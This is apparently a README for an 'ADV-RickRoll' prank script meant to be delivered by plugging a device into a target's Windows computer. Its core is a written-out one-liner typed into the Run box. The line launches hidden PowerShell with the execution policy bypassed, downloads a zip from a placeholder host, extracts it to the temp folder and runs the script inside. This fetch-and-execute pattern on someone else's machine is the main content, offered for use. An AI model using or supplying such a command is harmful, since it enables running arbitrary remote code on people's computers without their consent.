<!-- TABLE OF CONTENTS -->
<!--TABLE 0F C0NTENTS-->

# ADV-RickRoll

A script used to do an advanced rick roll on your target.

## Description

This program Rick Rolls your target without opening a muted youtube video.
A Rick Roll video is downloaded and played in your powershell console when a mouse movement is detected.

## Getting Started

### Dependencies

* An internet connection
* Windows 10,11

### Executing program

* Plug in your device
* Invoke-WebRequest will be entered in the Run Box to download and execute the dependencies and payload
```
powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";irm -Uri 'https://MYDOMAIN.HERE/qee' -O "$D\rr.zip";Expand-Archive "$D\rr.zip" -Des $D\rr -Force;. "$D\rr\rr.ps1"
```

##

## Contributing

All contributors names will be listed here

M3!

##

## Version History

* 0.1
    * Initial Release

##

